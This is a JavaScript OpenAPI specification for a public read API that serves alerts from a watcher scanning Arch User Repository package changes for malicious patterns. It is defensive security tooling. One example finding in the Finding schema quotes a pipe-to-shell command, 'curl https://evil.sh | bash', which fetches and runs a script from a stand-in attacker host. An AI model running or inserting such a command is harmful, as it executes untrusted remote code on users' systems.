// The OpenAPI 3.1 description of the public read API. It is the single source
// of truth: the Worker serves it at /api/openapi.json and the /api reference
// page renders from it, so the docs cannot drift from the routes.

const NOTIFICATION_SUMMARY = {
  type: 'object',
  description: 'One stored notification, without the full document.',
  properties: {
    slug: { type: 'string', description: 'Date/time id, `YYYY-MM-DD/HHMMSS` (the ntfy id is appended on a same-second clash).', example: '2026-10-14/114537' },
    time: { type: 'integer', description: 'Unix seconds.', example: 1791978337 },
    iso: { type: 'string', format: 'date-time', example: '2026-10-14T11:45:37.000Z' },
    event: { type: 'string', description: '`trustsight.alerts` or `trustsight.heartbeat`.', example: 'trustsight.alerts' },
    headline: { type: 'string', description: 'Deterministic short name derived from the top signal.', example: 'ghost-chat-git scored 100 (R010) +3 more' },
    title: { type: 'string', description: 'Title as published to ntfy.', example: 'TrustSight: ghost-chat-git scored 100 (R010) +3 more' },
    day: { type: 'string', description: 'AUR day when replaying history, else empty.', example: '' },
    priority: { type: ['integer', 'null'] },
    tags: { type: 'array', items: { type: 'string' } },
    counts: {
      type: 'object',
      properties: {
        alerts: { type: 'integer' },
        over_threshold: { type: 'integer' },
        ioc: { type: 'integer' },
        impersonation: { type: 'integer' },
      },
    },
    packages: { type: 'array', items: { type: 'string' }, description: 'Unique package names named in the document.' },
    ioc_packages: { type: 'array', items: { type: 'string' }, description: 'Packages that matched a known-bad indicator (IOC).' },
    rules: { type: 'array', items: { type: 'string' }, description: 'Unique rule ids that fired.' },
    tool_version: { type: 'string', description: 'TrustSight version that produced this document. Absent on older notifications.', example: '0.20.2' },
  },
}

const FINDING = {
  type: 'object',
  description: 'One located finding: the rule that fired, its severity and weight, and the file and line of the evidence. `file` is "" and `line` is null when the rule names a fact about the change rather than a line (novelty, provenance, a corpus signal).',
  properties: {
    rule_id: { type: 'string', example: 'R001' },
    severity: { type: 'string', example: 'HIGH' },
    weight: { type: 'integer', description: 'Points this finding contributes; 0 for declared practice, coverage and context.', example: 30 },
    file: { type: 'string', example: 'PKGBUILD' },
    line: { type: ['integer', 'null'], example: 12 },
    reason: { type: 'string', description: 'The rendered explanation of the finding.', example: 'Remote Script Execution: curl https://evil.sh | bash' },
  },
}

const NOTIFICATION = {
  allOf: [
    NOTIFICATION_SUMMARY,
    {
      type: 'object',
      properties: {
        payload: {
          type: 'object',
          description: 'The full TrustSight document as published to ntfy. `over_threshold[].findings` carries one object per located finding (see the Finding schema); `campaign_cluster[]` and `impersonation[]` name the affected packages per campaign.',
          additionalProperties: true,
          properties: {
            alerts: {
              type: 'array',
              description: 'One entry per package/rule pair first seen this cycle. Ownership rules (H044/H026) carry the transition they recorded: `old` is the previous maintainer (empty for an orphan) and `new` the adopter. Older documents carry only package and rule_id.',
              items: {
                type: 'object',
                properties: {
                  package: { type: 'string' },
                  rule_id: { type: 'string' },
                  maintainer: { type: 'string', description: 'Current maintainer of the package, when the watcher recorded it.' },
                  old: { type: 'string', description: 'Previous maintainer, when the rule recorded a transition.' },
                  new: { type: 'string', description: 'New maintainer, when the rule recorded a transition.' },
                  pkgbuild_sha256: { type: 'string', description: 'SHA-256 of the analysed PKGBUILD.' },
                  previous_pkgbuild_sha256: { type: 'string', description: 'SHA-256 of the previous PKGBUILD.' },
                  diff: { type: 'string', description: 'Bounded unified diff of the analysed change.' },
                  diff_sha256: { type: 'string', description: 'SHA-256 of the sanitized analysed diff.' },
                  diff_truncated: { type: 'boolean', description: 'The diff exceeded the notification cap and was omitted.' },
                },
              },
            },
            over_threshold: {
              type: 'array',
              items: {
                type: 'object',
                properties: {
                  package: { type: 'string' },
                  score: { type: 'integer' },
                  aur: { type: 'string', format: 'uri' },
                  version: { type: 'string' },
                  last_modified: { type: 'string' },
                  maintainer: { type: 'string', description: 'Current maintainer, when the watcher recorded it.' },
                  previous_maintainer: { type: 'string', description: 'Maintainer in the previous snapshot, when the watcher recorded it.' },
                  pkgbuild_sha256: { type: 'string' },
                  diff: { type: 'string' },
                  diff_sha256: { type: 'string' },
                  diff_truncated: { type: 'boolean' },
                  rules: { type: 'array', items: { type: 'string' }, description: 'Every rule id that fired, including zero-weight ones.' },
                  findings: { type: 'array', items: { $ref: '#/components/schemas/Finding' } },
                },
              },
            },
            ioc_matches: { type: 'array', items: { type: 'object', properties: { package: { type: 'string' }, indicator: { type: 'string' }, aur: { type: 'string', format: 'uri' } } } },
            campaign_cluster: { type: 'array', items: { type: 'object', properties: { rule_id: { type: 'string' }, campaign_id: { type: 'string' }, campaign_active: { type: 'boolean' }, members: { type: 'array', items: { type: 'string' } }, count: { type: 'integer' }, members_detail: { type: 'array', description: 'Per-member ownership and version context, when the watcher recorded it.', items: { type: 'object', properties: { package: { type: 'string' }, maintainer: { type: 'string' }, previous_maintainer: { type: 'string' }, version: { type: 'string' }, last_modified: { type: 'string' } } } } } } },
            impersonation: { type: 'array', items: { type: 'object', properties: { maintainer: { type: 'string' }, members: { type: 'array', items: { type: 'string' } }, targets: { type: 'array', items: { type: 'string' } }, count: { type: 'integer' } } } },
            refusals: { type: 'array', description: 'Packages whose analysis hit a parser refusal (X026/X027): the change was not fully read, so they alert regardless of score.', items: { type: 'object', properties: { package: { type: 'string' }, aur: { type: 'string', format: 'uri' } } } },
          },
        },
        message_raw: { type: 'string', description: 'The raw ntfy message body.' },
        verification: { type: 'object', nullable: true, description: 'Ed25519 provenance for the signed ingest path; null for older or ntfy-shaped rows.', properties: { algorithm: { type: 'string' }, webhook_id: { type: 'string' }, key_id: { type: 'string' }, signed_at: { type: 'integer' }, signature: { type: 'string' }, body_sha256: { type: 'string' } } },
      },
    },
  ],
}

const PAGINATION = {
  type: 'object',
  properties: {
    before: { type: 'integer', description: 'Pass as `before` to fetch the next page.' },
    beforeRow: { type: 'integer', description: 'Pass as `beforeRow` with `before`.' },
  },
  nullable: true,
}

const ERROR = {
  type: 'object',
  properties: {
    error: { type: 'string', example: 'not_found' },
    endpoints: { type: 'array', items: { type: 'string' } },
  },
}

const LIMIT = { name: 'limit', in: 'query', schema: { type: 'integer', minimum: 1, maximum: 200, default: 50 }, description: 'Page size.' }
const BEFORE = { name: 'before', in: 'query', schema: { type: 'integer' }, description: 'Keyset cursor from a previous response `next.before`.' }
const BEFORE_ROW = { name: 'beforeRow', in: 'query', schema: { type: 'integer' }, description: 'Keyset cursor from a previous response `next.beforeRow`.' }
const EVENT = { name: 'event', in: 'query', schema: { type: 'string', enum: ['all', 'trustsight.alerts', 'trustsight.heartbeat'], default: 'all' }, description: 'Filter by document type.' }

function listResponse(description) {
  return {
    description,
    content: {
      'application/json': {
        schema: {
          type: 'object',
          properties: {
            count: { type: 'integer' },
            query: { type: 'object', additionalProperties: true },
            items: { type: 'array', items: { $ref: '#/components/schemas/NotificationSummary' } },
            next: PAGINATION,
          },
        },
      },
    },
  }
}

const TRIGGER = {
  type: 'object',
  description: 'One normalized rule firing: a package, the rule, and where it fired. `file`, `line` and `reason` are included only when the request asks for evidence.',
  properties: {
    id: { type: 'integer', description: 'Stable cursor; pass it as `before` for the next page.' },
    package: { type: 'string', example: 'ghost-chat-git' },
    rule_id: { type: 'string', example: 'R010' },
    severity: { type: 'string', example: 'HIGH' },
    weight: { type: 'integer', example: 40 },
    source: { type: 'string', enum: ['finding', 'refusal', 'alert', 'campaign'], description: 'Which part of the watcher document recorded the firing.' },
    campaign_id: { type: 'string', description: 'Campaign id when the firing belongs to a campaign, else empty.' },
    time: { type: 'integer', description: 'Unix seconds.' },
    slug: { type: 'string', description: 'The notification that recorded it.' },
    file: { type: 'string', description: 'Evidence file (evidence requests only).' },
    line: { type: ['integer', 'null'], description: 'Evidence line (evidence requests only).' },
    reason: { type: 'string', description: 'Rendered explanation (evidence requests only).' },
  },
}

const TRIGGER_PARAMS = [
  { name: 'rule', in: 'query', schema: { type: 'string' }, description: 'One or more comma-separated rule ids, exact match.' },
  { name: 'campaign', in: 'query', schema: { type: 'string' }, description: 'Campaign id.' },
  { name: 'package', in: 'query', schema: { type: 'string' }, description: 'Exact AUR package name.' },
  { name: 'maintainer', in: 'query', schema: { type: 'string' }, description: 'Maintainer display name or email; matched by account identity.' },
  { name: 'severity', in: 'query', schema: { type: 'string' }, description: 'Severity of the firing.' },
  { name: 'source', in: 'query', schema: { type: 'string', enum: ['finding', 'refusal', 'alert', 'campaign'] } },
  { name: 'day', in: 'query', schema: { type: 'string' }, description: 'Replay day, `YYYY-MM-DD`.' },
  { name: 'since', in: 'query', schema: { type: 'integer' }, description: 'Unix seconds, inclusive.' },
  { name: 'until', in: 'query', schema: { type: 'integer' }, description: 'Unix seconds, inclusive.' },
  { name: 'include', in: 'query', schema: { type: 'string', enum: ['evidence', 'summary'] }, description: '`evidence` adds file/line/reason; `summary` adds per-rule, per-package and per-campaign counts.' },
  { name: 'format', in: 'query', schema: { type: 'string', enum: ['json', 'csv', 'ndjson'], default: 'json' } },
  { name: 'before', in: 'query', schema: { type: 'integer' }, description: 'Trigger id from a previous response `next.before`.' },
  { name: 'limit', in: 'query', schema: { type: 'integer', minimum: 1, maximum: 1000, default: 200 } },
]

const NOT_FOUND = { description: 'Not found.', content: { 'application/json': { schema: ERROR } } }
const BAD_REQUEST = { description: 'Bad request.', content: { 'application/json': { schema: ERROR } } }
const RATE_LIMITED = { description: 'Rate limit exceeded. See the Retry-After header.', headers: { 'retry-after': { schema: { type: 'integer' }, description: 'Seconds to wait.' } }, content: { 'application/json': { schema: ERROR } } }
const SERVER_ERROR = { description: 'Unexpected error.' }

export const openapiSpec = {
  openapi: '3.1.0',
  info: {
    title: 'TrustSight Watcher feed API',
    version: '1.0.0',
    description:
      'Read access to the preserved notifications of the TrustSight AUR watcher. '
      + 'Every document the watcher publishes to its ntfy topic is stored and served here. '
      + 'This is evidence, not proof of safety: a notification means a published rule matched '
      + 'a package change, never that a package is safe. No endpoint mutates data, and no '
      + 'request reaches the source package. '
      + 'The API is public and CORS-open. Each client is limited to 120 requests a minute, and '
      + 'search routes to 60; a response over either cap is HTTP 429 with a Retry-After header.',
    license: { name: 'MIT', url: 'https://github.com/emiliano-go/trustsight-feed/blob/main/LICENSE' },
  },
  servers: [{ url: 'https://watcher.trustsight.org', description: 'Production' }],
  tags: [
    { name: 'Feed', description: 'Browse and search the stored notifications.' },
    { name: 'Notifications', description: 'Fetch one or a few notifications.' },
    { name: 'Facets', description: 'Filter by date, package or rule.' },
    { name: 'Meta', description: 'Specification and aggregate stats.' },
  ],
  paths: {
    '/api/feed': {
      get: {
        tags: ['Feed'],
        summary: 'Search the feed',
        description: 'Newest first. Full-text search over package names, rule ids, versions, titles and days. Defaults to alert documents; pass `event=all` to include heartbeats.',
        parameters: [
          { name: 'q', in: 'query', schema: { type: 'string' }, description: 'Search terms; all terms must match (prefix).' },
          EVENT,
          { name: 'day', in: 'query', schema: { type: 'string' }, description: 'AUR day being replayed (exact match).' },
          { name: 'from', in: 'query', schema: { type: 'integer' }, description: 'Unix seconds, inclusive lower bound.' },
          { name: 'to', in: 'query', schema: { type: 'integer' }, description: 'Unix seconds, inclusive upper bound.' },
          { name: 'campaign', in: 'query', schema: { type: 'string' }, description: 'Only notifications naming this campaign id.' },
          { name: 'maintainer', in: 'query', schema: { type: 'string' }, description: 'Only notifications naming this maintainer.' },
          { name: 'rule', in: 'query', schema: { type: 'string' }, description: 'Only notifications whose indexed rules include this exact id.' },
          { name: 'over', in: 'query', schema: { type: 'boolean' }, description: 'Only documents with at least one over-threshold package.' },
          { name: 'ioc', in: 'query', schema: { type: 'boolean' }, description: 'Only documents with at least one IOC match.' },
          { name: 'campaigns', in: 'query', schema: { type: 'boolean' }, description: 'Only documents carrying a campaign cluster.' },
          { name: 'refusals', in: 'query', schema: { type: 'boolean' }, description: 'Only documents with a partial-analysis refusal.' },
          LIMIT, BEFORE, BEFORE_ROW,
        ],
        responses: { 200: listResponse('A page of notifications.'), 429: RATE_LIMITED, 500: SERVER_ERROR },
      },
    },
    '/api/latest': {
      get: {
        tags: ['Notifications'],
        summary: 'The most recent notification',
        description: 'The newest stored notification, with its full document. Any event type.',
        responses: {
          200: { description: 'The latest notification.', content: { 'application/json': { schema: { type: 'object', properties: { query: { type: 'object' }, item: { $ref: '#/components/schemas/Notification' } } } } } },
          404: { description: 'The store is empty.', content: { 'application/json': { schema: ERROR } } },
          429: RATE_LIMITED,
        },
      },
    },
    '/api/latest/{n}': {
      get: {
        tags: ['Notifications'],
        summary: 'The most recent n notifications',
        parameters: [
          { name: 'n', in: 'path', required: true, schema: { type: 'integer', minimum: 1, maximum: 200 } },
          EVENT, LIMIT, BEFORE, BEFORE_ROW,
        ],
        responses: { 200: listResponse('The latest n notifications.'), 429: RATE_LIMITED },
      },
    },
    '/api/date/{date}': {
      get: {
        tags: ['Facets'],
        summary: 'Everything on one UTC day',
        parameters: [
          { name: 'date', in: 'path', required: true, schema: { type: 'string' }, example: '2026-10-14' },
          EVENT, LIMIT, BEFORE, BEFORE_ROW,
        ],
        responses: { 200: listResponse('Notifications that UTC day.'), 400: BAD_REQUEST, 429: RATE_LIMITED },
      },
    },
    '/api/date/{date}/{timeframe}': {
      get: {
        tags: ['Facets'],
        summary: 'A timeframe within a UTC day',
        description: 'Timeframe is `HH` (one hour), `HH-HH` (whole hours) or `HHMM-HHMM` (a range), all UTC.',
        parameters: [
          { name: 'date', in: 'path', required: true, schema: { type: 'string' }, example: '2026-10-14' },
          { name: 'timeframe', in: 'path', required: true, schema: { type: 'string' }, examples: { hour: { value: '11' }, hours: { value: '10-12' }, minutes: { value: '1045-1200' } } },
          EVENT, LIMIT, BEFORE, BEFORE_ROW,
        ],
        responses: { 200: listResponse('Notifications in the timeframe.'), 400: BAD_REQUEST, 429: RATE_LIMITED },
      },
    },
    '/api/package/{name}': {
      get: {
        tags: ['Facets'],
        summary: 'Everything mentioning a package',
        parameters: [
          { name: 'name', in: 'path', required: true, schema: { type: 'string' }, example: 'ghost-chat-git' },
          EVENT, LIMIT, BEFORE, BEFORE_ROW,
        ],
        responses: { 200: listResponse('Notifications naming the package.'), 429: RATE_LIMITED },
      },
    },
    '/api/package/{name}/history': {
      get: {
        tags: ['Facets'],
        summary: 'Everything known about a package across the stored alerts',
        description: 'A newest-first timeline of every notification that names the package exactly, plus the rules, maintainer-change signals and upstream URLs those analyses record.',
        parameters: [
          { name: 'name', in: 'path', required: true, schema: { type: 'string' }, example: 'pgadmin4-server' },
        ],
        responses: {
          200: {
            description: 'The package history.',
            content: { 'application/json': { schema: { type: 'object', additionalProperties: true } } },
          },
          400: BAD_REQUEST, 429: RATE_LIMITED,
        },
      },
    },
    '/api/rule/{id}': {
      get: {
        tags: ['Facets'],
        summary: 'Everything a rule fired on',
        parameters: [
          { name: 'id', in: 'path', required: true, schema: { type: 'string' }, example: 'R010' },
          EVENT, LIMIT, BEFORE, BEFORE_ROW,
        ],
        responses: { 200: listResponse('Notifications where the rule fired.'), 429: RATE_LIMITED },
      },
    },
    '/api/triggers': {
      get: {
        tags: ['Facets'], summary: 'Normalized rule triggers',
        description: 'Every rule firing, one row per package, rule and located finding. This is the data behind `/api/rule/{id}`, `/api/campaign/{id}` and the rule chips in the feed, available as one request. `include=evidence` adds file, line and reason; `include=summary` adds aggregate counts.',
        parameters: [...TRIGGER_PARAMS],
        responses: {
          200: {
            description: 'Trigger rows.',
            content: {
              'application/json': {
                schema: {
                  type: 'object',
                  properties: {
                    count: { type: 'integer' },
                    query: { type: 'object', additionalProperties: true },
                    items: { type: 'array', items: { $ref: '#/components/schemas/Trigger' } },
                    summary: { type: 'object', additionalProperties: true },
                    next: PAGINATION,
                  },
                },
              },
              'text/csv': { schema: { type: 'string' } },
              'application/x-ndjson': { schema: { type: 'string' } },
            },
          },
          400: BAD_REQUEST, 429: RATE_LIMITED,
        },
      },
    },
    '/api/rules': {
      get: {
        tags: ['Facets'], summary: 'Rule firing counts',
        description: 'Rules observed in the trigger index, with firing, package and time bounds, most used first.',
        parameters: [LIMIT],
        responses: { 200: { description: 'Rule counts.', content: { 'application/json': { schema: { type: 'object', properties: { count: { type: 'integer' }, items: { type: 'array', items: { type: 'object', additionalProperties: true } } } } } } }, 429: RATE_LIMITED },
      },
    },
    '/api/rule/{id}/triggers': {
      get: {
        tags: ['Facets'], summary: 'Triggers for one rule',
        description: 'The same extraction as `/api/triggers`, pinned to one rule id.',
        parameters: [
          { name: 'id', in: 'path', required: true, schema: { type: 'string' }, example: 'R010' },
          ...TRIGGER_PARAMS.filter((param) => param.name !== 'rule'),
        ],
        responses: { 200: { description: 'Trigger rows.', content: { 'application/json': { schema: { type: 'object', additionalProperties: true } }, 'text/csv': { schema: { type: 'string' } } } }, 400: BAD_REQUEST, 429: RATE_LIMITED },
      },
    },
    '/api/messages/{slug}': {
      get: {
        tags: ['Notifications'],
        summary: 'One notification by slug',
        parameters: [{ name: 'slug', in: 'path', required: true, schema: { type: 'string' }, example: '2026-10-14/114537', description: 'May contain a slash.' }],
        responses: {
          200: { description: 'The notification with its full document.', content: { 'application/json': { schema: { $ref: '#/components/schemas/Notification' } } } },
          404: NOT_FOUND, 429: RATE_LIMITED,
        },
      },
    },
    '/api/source/{package}': {
      get: {
        tags: ['Facets'],
        summary: 'The analysed source file',
        description: 'The AUR repository file the findings point at (PKGBUILD by default), returned unmodified so a client can show the flagged lines. Only files in the AUR repository resolve; a file inside a downloaded source tarball does not.',
        parameters: [
          { name: 'package', in: 'path', required: true, schema: { type: 'string' }, example: 'yay' },
          { name: 'file', in: 'query', schema: { type: 'string', default: 'PKGBUILD' }, example: 'PKGBUILD', description: 'A file path in the AUR repository.' },
        ],
        responses: {
          200: {
            description: 'The file.',
            content: {
              'application/json': {
                schema: {
                  type: 'object',
                  properties: {
                    package: { type: 'string' },
                    file: { type: 'string' },
                    content: { type: 'string' },
                  },
                },
              },
            },
          },
          400: BAD_REQUEST, 404: NOT_FOUND, 429: RATE_LIMITED,
        },
      },
    },
    '/api/diff/{package}': {
      get: {
        tags: ['Facets'],
        summary: 'The latest AUR commit as a diff',
        description: 'The unified diff of the package\'s latest AUR commit, so a client can show what changed, including removed lines. These are the changes the watcher alerts on.',
        parameters: [{ name: 'package', in: 'path', required: true, schema: { type: 'string' }, example: 'inkdrop' }],
        responses: {
          200: {
            description: 'The diff.',
            content: {
              'application/json': {
                schema: { type: 'object', properties: { package: { type: 'string' }, diff: { type: 'string' } } },
              },
            },
          },
          400: BAD_REQUEST, 429: RATE_LIMITED,
        },
      },
    },
    '/api/maintainers': {
      get: {
        tags: ['Facets'],
        summary: 'Current AUR maintainers for a batch',
        description: 'The current AUR maintainer for up to 100 packages, cached server-side so a list view does not spend one RPC per row. A package the RPC did not answer maps to the empty string; an unknown package is not distinguished from an orphan.',
        parameters: [
          { name: 'packages', in: 'query', description: 'Comma-separated package names (maximum 100).', schema: { type: 'string' }, example: 'yay,paru' },
        ],
        responses: {
          200: {
            description: 'Package name to maintainer (empty when unknown).',
            content: {
              'application/json': {
                schema: {
                  type: 'object',
                  properties: {
                    maintainers: { type: 'object', additionalProperties: { type: 'string' } },
                  },
                },
              },
            },
          },
          429: RATE_LIMITED,
        },
      },
    },
    '/api/feed.atom': {
      get: {
        tags: ['Feed'], summary: 'Atom subscription',
        description: 'The same alerts as `/api/feed`, as Atom 1.0. Filters match the JSON feed; the result is capped at 100 items.',
        responses: { 200: { description: 'Atom feed.', content: { 'application/atom+xml': { schema: { type: 'string' } } } }, 429: RATE_LIMITED },
      },
    },
    '/api/feed.json': {
      get: {
        tags: ['Feed'], summary: 'JSON Feed subscription',
        description: 'The same alerts as `/api/feed`, as JSON Feed 1.1. Filters match the JSON feed; the result is capped at 100 items.',
        responses: { 200: { description: 'JSON Feed.', content: { 'application/feed+json': { schema: { type: 'object', additionalProperties: true } } } }, 429: RATE_LIMITED },
      },
    },
    '/api/campaigns': {
      get: {
        tags: ['Facets'], summary: 'List campaigns',
        description: 'Campaigns derived from the stored notifications, newest first.',
        parameters: [LIMIT],
        responses: { 200: { description: 'Campaign summaries.', content: { 'application/json': { schema: { type: 'object', properties: { count: { type: 'integer' }, items: { type: 'array', items: { type: 'object', additionalProperties: true } } } } } } }, 429: RATE_LIMITED },
      },
    },
    '/api/campaign/{id}': {
      get: {
        tags: ['Facets'], summary: 'One campaign',
        description: 'Campaign members, lifecycle and the notification timeline. Legacy campaigns use a deterministic `legacy:` id.',
        parameters: [{ name: 'id', in: 'path', required: true, schema: { type: 'string' } }],
        responses: { 200: { description: 'Campaign detail.', content: { 'application/json': { schema: { type: 'object', additionalProperties: true } } } }, 400: BAD_REQUEST, 404: NOT_FOUND, 429: RATE_LIMITED },
      },
    },
    '/api/maintainer/{name}': {
      get: {
        tags: ['Facets'], summary: 'One maintainer',
        description: 'Packages, ownership transitions and campaigns recorded for a maintainer. Names are matched by account identity where an email is present.',
        parameters: [{ name: 'name', in: 'path', required: true, schema: { type: 'string' } }, LIMIT],
        responses: { 200: { description: 'Maintainer detail.', content: { 'application/json': { schema: { type: 'object', additionalProperties: true } } } }, 400: BAD_REQUEST, 429: RATE_LIMITED },
      },
    },
    '/api/iocs': {
      get: {
        tags: ['Facets'], summary: 'Known-bad indicators',
        description: 'Deduplicated indicators from stored IOC matches. `format` selects JSON, NDJSON, CSV or STIX 2.1.',
        parameters: [
          { name: 'format', in: 'query', schema: { type: 'string', enum: ['json', 'ndjson', 'csv', 'stix'], default: 'json' } },
          { name: 'package', in: 'query', schema: { type: 'string' } },
          { name: 'since', in: 'query', schema: { type: 'integer' } },
          { name: 'until', in: 'query', schema: { type: 'integer' } },
          LIMIT,
        ],
        responses: { 200: { description: 'Indicators.', content: { 'application/json': { schema: { type: 'object', additionalProperties: true } }, 'text/csv': { schema: { type: 'string' } } } }, 429: RATE_LIMITED },
      },
    },
    '/api/keys': {
      get: {
        tags: ['Meta'], summary: 'Notification signing keys',
        description: 'The public Ed25519 keys for ingest and archive checkpoints. `purpose` separates them; the private keys are never exposed.',
        responses: { 200: { description: 'Public keys.', content: { 'application/json': { schema: { type: 'object', properties: { keys: { type: 'array', items: { type: 'object', properties: { id: { type: 'string' }, public_key: { type: 'string' }, current: { type: 'boolean' }, purpose: { type: 'string', enum: ['ingest', 'checkpoint'] } } } } } } } } } },
      },
    },
    '/api/checkpoints': {
      get: {
        tags: ['Meta'], summary: 'Signed archive checkpoints',
        description: 'Newest-first complete checkpoints. Each chains to the previous root and carries an Ed25519 signature.',
        parameters: [LIMIT],
        responses: { 200: { description: 'Checkpoints.', content: { 'application/json': { schema: { type: 'object', additionalProperties: true } } } }, 429: RATE_LIMITED },
      },
    },
    '/api/checkpoints/{id}': {
      get: {
        tags: ['Meta'], summary: 'One checkpoint',
        parameters: [{ name: 'id', in: 'path', required: true, schema: { type: 'string' } }],
        responses: { 200: { description: 'Checkpoint row.', content: { 'application/json': { schema: { type: 'object', additionalProperties: true } } } }, 400: BAD_REQUEST, 404: NOT_FOUND, 429: RATE_LIMITED },
      },
    },
    '/api/checkpoints/{id}/proof': {
      get: {
        tags: ['Meta'], summary: 'Inclusion proof for one notification',
        parameters: [
          { name: 'id', in: 'path', required: true, schema: { type: 'string' } },
          { name: 'slug', in: 'query', required: true, schema: { type: 'string' } },
        ],
        responses: { 200: { description: 'Leaf hash and audit path.', content: { 'application/json': { schema: { type: 'object', additionalProperties: true } } } }, 400: BAD_REQUEST, 404: NOT_FOUND, 429: RATE_LIMITED },
      },
    },
    '/api/stats': {
      get: {
        tags: ['Meta'],        summary: 'Aggregate counts',
        description: 'Totals over alert documents plus the alive/heartbeat count. `last` is the most recent stored notification of any kind; `last_alert` and `last_alive` name the two event clocks separately.',
        responses: {
          200: {
            description: 'Aggregates.',
            content: {
              'application/json': {
                schema: {
                  type: 'object',
                  properties: {
                    total: { type: 'integer' },
                    alive: { type: 'integer', description: 'Stored heartbeat notifications.' },
                    first: { type: ['integer', 'null'], description: 'Unix seconds.' },
                    last: { type: ['integer', 'null'], description: 'Unix seconds of the most recent notification of any kind, including heartbeats.' },
                    last_alert: { type: ['integer', 'null'], description: 'Unix seconds of the most recent alert.' },
                    last_alive: { type: ['integer', 'null'], description: 'Unix seconds of the most recent heartbeat.' },
                    alerts: { type: 'integer' },
                    over_threshold: { type: 'integer' },
                    ioc: { type: 'integer' },
                    impersonation: { type: 'integer' },
                    tool_version: { type: 'string', description: 'TrustSight version of the most recent alert document, read from its stored payload. Absent on older notifications.' },
                  },
                },
              },
            },
          },
          429: RATE_LIMITED,
        },
      },
    },
    '/api/openapi.json': {
      get: {
        tags: ['Meta'],
        summary: 'This specification',
        responses: { 200: { description: 'The OpenAPI document.', content: { 'application/json': { schema: { type: 'object' } } } }, 429: RATE_LIMITED },
      },
    },
    '/health': {
      get: {
        tags: ['Meta'],
        summary: 'Liveness and readiness',
        description: 'Returns ok with the schema version and the time of the most recent notification, or 503 when the database is unreachable. Not rate limited.',
        responses: {
          200: {
            description: 'Healthy.',
            content: {
              'application/json': {
                schema: {
                  type: 'object',
                  properties: {
                    status: { type: 'string', example: 'ok' },
                    time: { type: 'string', format: 'date-time' },
                    db: { type: 'string', example: 'ok' },
                    schema: { type: ['string', 'null'], example: '1' },
                    last: { type: ['integer', 'null'], description: 'Unix seconds of the most recent notification.' },
                  },
                },
              },
            },
          },
          503: { description: 'Database unreachable.', content: { 'application/json': { schema: ERROR } } },
        },
      },
    },
  },
  components: {
    schemas: {
      NotificationSummary: NOTIFICATION_SUMMARY,
      Notification: NOTIFICATION,
      Finding: FINDING,
      Trigger: TRIGGER,
    },
  },
}
